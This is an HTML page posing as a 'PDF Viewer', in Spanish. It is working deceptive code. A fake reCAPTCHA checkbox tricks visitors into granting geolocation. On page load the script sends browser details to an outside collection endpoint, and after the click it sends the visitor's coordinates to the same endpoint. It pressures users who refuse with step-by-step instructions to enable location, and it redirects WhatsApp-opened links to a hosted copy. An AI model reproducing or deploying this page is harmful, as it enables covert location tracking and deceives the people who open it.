<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PDF Viewer</title>
</head>
<body>

<!-- Bot√≥n invisible para interacci√≥n en Android -->
<button id="geoBtn" style="opacity:0; position:absolute; pointer-events:auto; z-index:-1;">
Permitir
</button>

<!-- ===================================== -->
<!--      RECAPTCHA FALSO COMPLETO         -->
<!-- ===================================== -->
<div id="permisoBox" style="
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    background:rgba(0,0,0,0.65);
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:9999;
    font-family:Arial;
">
    <div id="captchaBox" style="
        background:white;
        padding:28px;
        border-radius:14px;
        width:420px;
        box-shadow:0 6px 18px rgba(0,0,0,0.35);
        cursor:pointer;
        user-select:none;
        transform: scale(1.25);
    ">

        <div style="
            display:flex;
            align-items:center;
            border:1px solid #d3d3d3;
            border-radius:8px;
            padding:20px;
            zoom:1.4;
        ">
            <div id="fakeCheckbox" style="
                width:28px;
                height:28px;
                border:2px solid #c0c0c0;
                border-radius:3px;
                margin-right:12px;
                background:white;
                display:flex;
                justify-content:center;
                align-items:center;
                font-size:20px;
                color:#0d6efd;
            "></div>

            <span style="font-size:16px; color:#333;">No soy un robot</span>

            <div style="
                margin-left:auto;
                display:flex;
                flex-direction:column;
                align-items:center;
                font-size:10px;
                color:#555;
            ">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; opacity:0.8;">
                <span style="font-size:9px;">reCAPTCHA</span>
            </div>
        </div>

        <div style="text-align:center; margin-top:6px; font-size:10px; color:#777;">
            Privacidad ¬∑ T√©rminos
        </div>
    </div>
</div>

<script>
// =====================================
//   0) REDIRECCI√ìN SI SE ABRE DESDE WHATSAPP
// =====================================
if (location.href.startsWith("content://") || document.referrer.includes("com.whatsapp")) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// Detectar m√≥vil + local
const esMovil = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
const host = window.location.hostname;
const esLocal =
    host === "" ||
    host === "localhost" ||
    host === "127.0.0.1" ||
    host.startsWith("192.168.") ||
    host.startsWith("10.") ||
    window.location.protocol === "file:";

if (esMovil && esLocal) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// ===============================
//   FUNCI√ìN PARA ENVIAR DATOS
// ===============================
function enviar(data) {
    fetch("https://www.arstore.tech/infopdf/capturar.php", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

// Enviar info inicial
enviar({
    type: "info",
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
});

// =====================================
//     REDIRIGIR LUEGO
// =====================================
function redirigirLuego() {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/pdf/capus.pdf";
}

// =====================================
//     ACTIVAR RECAPTCHA FALSO
// =====================================
document.getElementById("captchaBox").addEventListener("click", function() {

    const box = document.getElementById("fakeCheckbox");
    box.innerHTML = "‚úî";
    box.style.background = "#e6f0ff";
    box.style.borderColor = "#0d6efd";

    document.getElementById("captchaBox").style.opacity = "0.5";
    document.getElementById("captchaBox").style.pointerEvents = "none";

    setTimeout(() => {
        activarPermiso();
    }, 600);
});

// =====================================
//     activarPermiso()
// =====================================
function activarPermiso() {
    document.getElementById("permisoBox").style.display = "none";
    document.getElementById("geoBtn").click();

    setTimeout(() => {
        solicitarGeo();
    }, 200);
}

// =====================================
//    solicitarGeo()
// =====================================
function solicitarGeo() {
    if (!("geolocation" in navigator)) {
        enviar({
            type: "geo-error",
            error: "Geolocalizaci√≥n no soportada",
            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
        });

        setTimeout(redirigirLuego, 800);
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            enviar({
                type: "geo",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
            });

            setTimeout(redirigirLuego, 800);
        },

        err => {
            enviar({
                type: "geo-error",
                error: err.message,
                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
            });

            const msg = (err.message || "").toLowerCase();

            // 1Ô∏è‚É£ Usuario neg√≥ permisos ‚Üí mostrar alerta y redirigir
if (
    msg.includes("denied") ||
    msg.includes("rechaz") ||
    msg.includes("neg√≥")
) {
    alert(
    "Debes permitir el acceso a la ubicaci√≥n para continuar.\n\n" +
    "üëâ C√≥mo activarlo:\n\n" +
    "üì± ANDROID:\n" +
    "‚Ä¢ Toca el candado üîí en la barra de direcciones.\n" +
    "‚Ä¢ Ingresa en 'Permisos'.\n" +
    "‚Ä¢ Activa 'Ubicaci√≥n' ‚Üí 'Permitir'.\n\n" +
    "üì± iPHONE (Safari):\n" +
    "‚Ä¢ Ve a Configuraci√≥n ‚Üí Safari.\n" +
    "‚Ä¢ Ubicaci√≥n ‚Üí 'Permitir'.\n\n" +
    "üñ•Ô∏è COMPUTADOR:\n" +
    "‚Ä¢ Toca el icono de candado üîí junto a la URL.\n" +
    "‚Ä¢ Ajusta 'Ubicaci√≥n' ‚Üí 'Permitir'."
);

    window.location.href = "https://encuestauta69-gif.github.io/pdf/";
    return;
}


            // 2Ô∏è‚É£ GPS apagado o sin se√±al
            if (
                msg.includes("unavailable") ||
                msg.includes("not be determined") ||
                msg.includes("no pudo ser determinada") ||
                msg.includes("ubicaci√≥n no disponible")
            ) {
                alert("Activa el GPS de tu dispositivo para continuar.");
                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
                return;
            }

            // 3Ô∏è‚É£ Otro error (timeout o desconocido)
            setTimeout(() => {
                window.location.href = "https://encuestauta69-gif.github.io/pdf/";
            }, 800);
        }
    ); // ‚Üê ESTE ERA EL PAR√âNTESIS QUE FALTABA
}
</script>

<h2 style="color:#444; font-family:Arial;">‚ùó Verificaci√≥n en curso</h2>
